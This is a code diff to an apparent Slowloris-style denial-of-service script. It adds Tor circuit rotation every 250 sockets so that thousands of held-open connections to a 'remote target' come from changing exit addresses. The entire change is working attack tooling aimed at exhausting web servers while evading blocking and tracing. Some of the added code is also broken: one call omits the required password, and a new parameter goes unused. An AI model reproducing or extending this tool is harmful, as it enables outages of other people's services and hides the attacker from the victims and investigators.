@@ -15,12 +15,17 @@ import socket
 import logging
 import time
 from random import randint, choice
+from stem import Signal
+from stem.control import Controller
+
+# Start tor controller on 9051 to change circuits
+controller = Controller.from_port(port = 9051)
 
 # Initializes a connection with specified options
-def init_connection(target, port, randomize, user_agents):
+def init_connection(target, port, randomize, user_agents, tor):
     # Create the new socket
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(5)
+    sock.settimeout(15)
     # Connect to target
     sock.connect((target, port))
     # Send request
@@ -35,13 +40,20 @@ def init_connection(target, port, randomize, user_agents):
     # Return the conected socket
     return sock
 
+# Get new tor circuit
+
+def get_new_tor_circuit(password):
+    controller.authenticate(password)
+    controller.signal(Signal.NEWNYM)
+    return 0
+
 # Use click to handle arguments and switches
 
 @click.command()
 @click.option('--port', '-p', default=80, help="Port to attack on the remote target. Default is 80.")
 @click.option('--sockets', '-s', default=10000, help="Number of sockets to open with the remote target.")
 @click.option('--randomize', '-r', is_flag=True, help="Randomize user agents for every new socket.")
-@click.option('--tor', '-T', is_flag=True, help="Open the connections the connections through the Tor network by using localhost:9050 as a SOCKS5 proxy. If you wish to use the Tor network through another host or port you must use the -x option.")
+@click.option('--tor', '-T', help="Open the connections the connections through the Tor network by using localhost:9050 as a SOCKS5 proxy. The value here is the PASSWORD for the tor controller assumed running on 9051. If you wish to use the Tor network through another host or port you must use the -x option.")
 @click.option('--proxy', '-x', help="Usage: -x proxy-host:proxy-port .Use a SOCKS5 proxy to communicate with the target.")
 @click.option('--quiet', '-q', is_flag=True, help="Run the script in quiet mode removing all output.")
 @click.argument('target', required=1)
@@ -122,6 +134,9 @@ def attack(target, port, sockets, randomize, tor, proxy, quiet):
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
     ]
 
+    # Count sockets per circuit
+    if tor:
+        current_circuit = 0
 
     # Inform user the script has started
     logging.info("Target: %s \tSockets: %s", target, sockets)
@@ -130,15 +145,24 @@ def attack(target, port, sockets, randomize, tor, proxy, quiet):
 
     # Start connecting with the target
     for i in range(sockets):
+        if tor:
+            if current_circuit >= 250:
+                current_circuit = get_new_tor_circuit(tor)
         try:
             logging.debug("Creating socket number %s", i)
-            sock = init_connection(target, port, randomize, user_agents)
+            sock = init_connection(target, port, randomize, user_agents, tor)
         except socket.error:
             break
         socket_list.append(sock)
+        # Update number of sockets of the circuit
+        if tor:
+            current_circuit +=1
 
     # Send the keep-alive messages so the target doesn't close the connections
     while True:
+        if tor:
+            if current_circuit >= 250:
+                current_circuit = get_new_tor_circuit()
         logging.info("Keeping connections alive... Socket count: %s", len(socket_list))
         for sock in list(socket_list):
             try:
@@ -151,9 +175,12 @@ def attack(target, port, sockets, randomize, tor, proxy, quiet):
         logging.debug("Recreating dead sockets...")
         for i in range(sockets - len(socket_list)):
             try:
-                sock = init_connection(target, port, randomize, user_agents)
+                sock = init_connection(target, port, randomize, user_agents, tor)
                 if sock:
                     socket_list.append(sock)
+                    # Update number of sockets of the circuit
+                    if tor:
+                        current_circuit +=1
             except socket.error:
                 break
 
